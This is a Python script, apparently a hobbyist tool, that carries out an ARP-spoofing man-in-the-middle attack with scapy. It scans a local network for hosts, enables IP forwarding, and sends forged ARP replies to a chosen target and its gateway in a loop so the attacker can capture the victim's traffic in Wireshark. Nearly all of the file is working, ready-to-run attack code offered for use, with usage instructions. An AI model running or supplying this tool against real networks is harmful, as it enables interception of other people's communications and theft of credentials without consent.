#!/usr/bin/python3

# _*_ coding: utf-8 _*_


#the program will be using scapy and poisoning arp table to perform the MITM attack
#just select your target,gateway and interface and run the script :)
#need to run the script with sudo priviledges

import os,sys,getopt
import threading
import scapy.all as scapy
from time import sleep

# <-- Termcolor -->
RED = "\033[0;31m"
YLW = "\033[1;33m"
GRN = "\033[0;32m"
WHITE = "\033[0m"

PACKET = 0
PORT_FORWARD_PATH = ' /proc/sys/net/ipv4/ip_forward'  #for linux (set it to 1 to allow port forwarding)

def ifsudo():
    if os.getuid() == 0:
        pass
    else:
        print('[+] Run the File with Sudo permission!')
        exit()


#scanning for live host on the network
def scanlivehosts(network_range):
    #creating ARP packet
    request = scapy.ARP()
    #Setting the network range
    request.pdst = network_range
    #creating an ethernet packet
    broadcast = scapy.Ether()
    #broadcasting
    broadcast.dst = 'ff:ff:ff:ff:ff:ff'
    #Combining ARP request packet and Ethernet frame using ‘/’.
    request_broadcast = broadcast / request  
    #Sending the request and capture the response 
    clients = scapy.srp(request_broadcast, timeout = 10,verbose = False)[0] 
    #printing the info of the devices
    for info in clients:  
        print(f'Host {RED}{info[1].psrc}{WHITE} is up --> MAC: {RED}{info[1].hwsrc}{WHITE}')
    #sys.exit(1)
    return

#setting 0(default) to 1 to allow port forwarding
def setportforwardingtoTrue():
    os.system(f'echo 1 > {PORT_FORWARD_PATH}')

def setportforwardingtoFalse():
    os.system(f'echo 0 > {PORT_FORWARD_PATH}')

#getting target's mac address
def mac(target):
    arp_request = scapy.ARP(pdst = target) 
    broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff") 
    arp_request_broadcast = broadcast / arp_request 
    answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0] 
    return answered_list[0][1].hwsrc if answered_list  else None  #using if else one liner

#spoofing
def arpspoofing(target,gateway):
    macaddr = mac(target)  #getting target's mac
    packet = scapy.ARP(op = 2,pdst = target,hwdst = macaddr,psrc = gateway) #creating ARP packet 'who has {target_ip}? Tell {my_ip}'
    scapy.send(packet, verbose = False) #broadcasting  [setting verbose=False because by defaul scapy produces very verbose output,which is not needed in the program]

#poisoning
def arppoisoning(target,gateway):
    global PACKET
    try:
        while True:
            arpspoofing(target,gateway) #spoofing the target
            arpspoofing(gateway,target) #spoofing the gateway
            PACKET += 2
            print(f'[+] ARP Packets Sent: {PACKET}',end = '\r')
            sleep(1)
    
    except:
        pass




if __name__ == '__main__':
    if sys.hexversion >= 0x3000000: 
        #banner
        print(rf'''
{RED}      ___                                      ___       {WHITE}
{RED}     /  /\           ___         ___          /  /\      {WHITE}
{RED}    /  /::|         /__/\       /__/\        /  /::|     {WHITE}
{YLW}   /  /:|:|         \__\:\      \  \:\      /  /:|:|     {WHITE}
{YLW}  /  /:/|:|__       /  /::\      \__\:\    /  /:/|:|__   {WHITE}
{YLW} /__/:/_|::::\   __/  /:/\/      /  /::\  /__/:/_|::::\  {WHITE}
{GRN} \__\/  /~~/:/  /__/\/:/        /  /:/\:\ \__\/  /~~/:/  {WHITE}
{GRN}       /  /:/   \  \::/        /  /:/__\/       /  /:/   {WHITE}
{GRN}      /  /:/     \  \:\       /__/:/           /  /:/    {WHITE}
{RED}     /__/:/       \__\/       \__\/           /__/:/     {WHITE}
{RED}     \__\/                                    \__\/      {WHITE}
                                    
                                            -@Debang5hu
''')
        

        #checks for sudo permission
        ifsudo()

        try:
            if '-s' in sys.argv[1] or '--scan' in sys.argv[1]:
                scanlivehosts(sys.argv[2])

            else:
                #cli inputs
                try:
            
                    #arguments
                    arguments=sys.argv[1:]
                    args,null=getopt.getopt(arguments,"i:t:g:",["interface=","target=","gateway="])


                    for x,y in args:
                        if x in ['-i','--interface']:
                            interface = y
                        if x in ['-t','--target']:
                            target = y
                        if x in ['-g','--gateway']:
                            gateway = y
                        if x in ['-s','--scan']:
                            scanlivehosts(y)
                            sys.exit(1)

                    #target = '192.168.1.2'
                    #gateway = '192.168.1.1'
                    #interface = 'wlan0'
            
            
                    #setting it to 1
                    setportforwardingtoTrue()

                    #info
                    print(f'[+] Target --> {target}')
                    print(f'[+] Gateway --> {gateway}')
                    print(f'[+] Interface --> {interface}')
                    print('------------------------------------------------')
                    print(f'[!] Make sure to {RED}OPEN WIRESHARK{WHITE} and capture the request with the filter "{RED}ip.addr=={target}{WHITE}"')

                    #using threading concept
                    t1 = threading.Thread(target = arppoisoning,args= (target,gateway),daemon= True )  #daemon = True to run it in background

                    #to start the thread
                    t1.start()

                    #joining
                    t1.join()
            
        
                except KeyboardInterrupt:
                    print('\n[+] Stopping the Attack!')
                    setportforwardingtoFalse()
            

        except:
            print('[+] Usage: sudo python3 arpmitm.py -i {interface} -t {target ip} -g {gateway ip}')
            print('''
            -s {ip range} or --scan {ip range} --> [sudo python3 arpmitm.py --scan 192.168.0.0/24]
            -i {interface name} or --interface {interface name}
            -t {target ip} or --target {target ip}
            -g {gateway ip} or --gateway (gateway ip)''')
    
    else:
        print('[+] [+] Required Python Version > 3.0!')

